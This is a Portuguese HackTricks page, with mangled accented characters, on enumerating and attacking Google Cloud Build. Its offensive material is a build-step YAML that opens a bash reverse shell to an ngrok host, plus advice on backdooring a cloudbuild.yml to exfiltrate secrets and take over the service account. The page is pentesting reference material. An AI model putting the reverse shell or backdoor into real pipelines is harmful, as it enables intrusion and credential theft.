# GCP - Enumera√ß√£o do Cloud Build

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo do** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## Informa√ß√µes B√°sicas

O Google Cloud Build √© uma plataforma gerenciada de CI/CD que **automatiza processos de constru√ß√£o e libera√ß√£o de software**, integrando-se com **reposit√≥rios de c√≥digo-fonte** e suportando uma ampla gama de linguagens de programa√ß√£o. Ele **permite que desenvolvedores construam, testem e implantem c√≥digo automaticamente**, oferecendo flexibilidade para personalizar etapas de constru√ß√£o e fluxos de trabalho.

Cada Gatilho do Cloud Build est√° **relacionado a um Reposit√≥rio Cloud ou diretamente conectado a um reposit√≥rio externo** (Github, Bitbucket ou Gitlab).

√â poss√≠vel configurar um Cloud Build para **exigir aprova√ß√µes para execu√ß√µes de constru√ß√£o** (desativado por padr√£o).

A **Conta de Servi√ßo tem o escopo `cloud-platform`**, ent√£o ela pode **usar todos os privil√©gios.** Se **nenhuma Conta de Servi√ßo for especificada** (como quando se faz um envio), a **Conta de Servi√ßo padr√£o** `<proj-number>@cloudbuild.gserviceaccount.com` ser√° **usada.**

{% hint style="success" %}
N√£o consegui encontrar nenhuma maneira de roubar o token do Github/Bitbucket daqui ou dos Reposit√≥rios Cloud porque quando o reposit√≥rio √© baixado, ele √© acessado via uma URL [https://source.cloud.google.com/](https://source.cloud.google.com/) e o Github n√£o √© acessado pelo cliente.
{% endhint %}

### Armazenamento

√Äs vezes, o Cloud Build **gerar√° um novo armazenamento para guardar os arquivos para o gatilho**. Isso acontece, por exemplo, no exemplo que o GCP oferece com:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Um bucket do Storage chamado [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) √© criado para armazenar um `.tgz` com os arquivos a serem utilizados.

### Obter shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### Enumera√ß√£o

Voc√™ pode encontrar **informa√ß√µes sens√≠veis nas configura√ß√µes de build e logs**.
```bash
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs
```
## Escalada de Privil√©gios

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Acesso N√£o Autenticado

### cloudbuild.yml

Se voc√™ comprometer o acesso de escrita em um reposit√≥rio contendo um arquivo chamado **`cloudbuild.yml`**, voc√™ poder√° **inserir um backdoor** neste arquivo, que especifica os **comandos que ser√£o executados** dentro de um Cloud Build e exfiltrar os segredos, comprometer o que √© feito e tamb√©m comprometer a **conta de servi√ßo do Cloud Build.**

{% hint style="info" %}
Note que o GCP tem a op√ß√£o de permitir que administradores controlem a execu√ß√£o de sistemas de build de PRs externos via "Comment Control". Comment Control √© um recurso onde colaboradores/propriet√°rios do projeto **precisam comentar ‚Äú/gcbrun‚Äù para acionar o build** contra o PR e usar esse recurso impede que qualquer pessoa na internet acione seus sistemas de build.
{% endhint %}

Para algumas informa√ß√µes relacionadas, voc√™ pode verificar a p√°gina sobre como atacar Github Actions (similar a esta):

{% content-ref url="../../../pentesting-ci-cd/github-security/abusing-github-actions/" %}
[abusing-github-actions](../../../pentesting-ci-cd/github-security/abusing-github-actions/)
{% endcontent-ref %}

<details>

<summary><strong>Aprenda hacking em AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>
